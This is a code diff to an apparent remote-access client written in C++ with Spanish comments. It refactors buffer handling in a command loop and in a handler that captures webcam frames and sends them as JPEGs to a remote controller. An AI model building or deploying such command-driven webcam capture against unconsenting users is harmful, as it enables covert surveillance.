@@ -84,11 +84,14 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 }
 
 void Cliente::MainLoop() {
-
     //Esperar por comandos
     DWORD error_code = 0;
-    char cBuffer[1024 * 100]; //100 kb (transferencia de archivos)
-    memset(&cBuffer, 0, sizeof(cBuffer));
+    const int iBuffSize = 1024 * 100; //100 kb
+    std::vector<char> cBuffer(iBuffSize);
+    if (cBuffer.size() == 0) {
+        DebugPrint("[MAIN-LOOP] No se pudo reservar memoria para el buffer principal");
+        return;
+    }
     while (true) {
         std::unique_lock<std::mutex> lock(this->mtx_running);
         if (!this->isRunning) {
@@ -96,12 +99,7 @@ void Cliente::MainLoop() {
         }
         lock.unlock();
 
-        //Limpiar el buffer
-        if (cBuffer[0] != 0) {
-            memset(&cBuffer, 0, sizeof(cBuffer));
-        }
-
-        int iRecibido = this->cRecv(this->sckSocket, cBuffer, sizeof(cBuffer), 0, false, &error_code);
+        int iRecibido = this->cRecv(this->sckSocket, cBuffer.data(), iBuffSize-1, 0, false, &error_code);
 
         if (iRecibido < 0 && error_code != WSAEWOULDBLOCK) {
             //No se pudo recibir nada
@@ -119,7 +117,8 @@ void Cliente::MainLoop() {
         }
 
         if (iRecibido > 0) {
-            this->ProcesarComando(cBuffer, iRecibido);
+            cBuffer[iRecibido] = '\0';
+            this->ProcesarComando(cBuffer.data(), iRecibido);
         }
 
     }
@@ -148,7 +147,7 @@ void Cliente::MainLoop() {
     }
 }
 
-void Cliente::ProcesarComando(char* pBuffer, int iSize) {
+void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
 
     std::vector<std::string> strIn = strSplit(std::string(pBuffer), CMD_DEL, 1);
     if (strIn.size() == 0) {
@@ -458,22 +457,21 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
                 strHeader += strIn[1];
                 strHeader.append(1, CMD_DEL);
 
-                //Testing
                 int iHeaderSize = strHeader.size();
-                u_int iJPGBufferSize = 0;
                 u_int uiPacketSize = 0;
                 std::vector<BYTE> cBuffer = this->mod_Cam->GetFrame(iDeviceIndex);
                 
                 if (cBuffer.size() > 0) {
                     std::vector<BYTE> cJPGBuffer = this->mod_Cam->toJPEG(cBuffer.data(), cBuffer.size());
+                    u_int iJPGBufferSize = cJPGBuffer.size();
                     if (iJPGBufferSize > 0) {
                         uiPacketSize = iHeaderSize + iJPGBufferSize;
-                        std::unique_ptr<BYTE> cPacket = std::make_unique<BYTE>(uiPacketSize);
-                        if (cPacket) {
-                            memcpy(cPacket.get(), strHeader.c_str(), iHeaderSize);
-                            memcpy(cPacket.get() + iHeaderSize, cJPGBuffer.data(), cJPGBuffer.size());
+                        std::vector<BYTE> cPacket(uiPacketSize);
+                        if (cPacket.size() > 0) {
+                            memcpy(cPacket.data(), strHeader.c_str(), iHeaderSize);
+                            memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), iJPGBufferSize);
 
-                            int iSent = this->cSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.get()), uiPacketSize, 0, true, nullptr);
+                            int iSent = this->cSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.data()), uiPacketSize, 0, true, nullptr);
                             DebugPrint("[!] " + std::to_string(iSent) + " bytes sent");
 
                         }
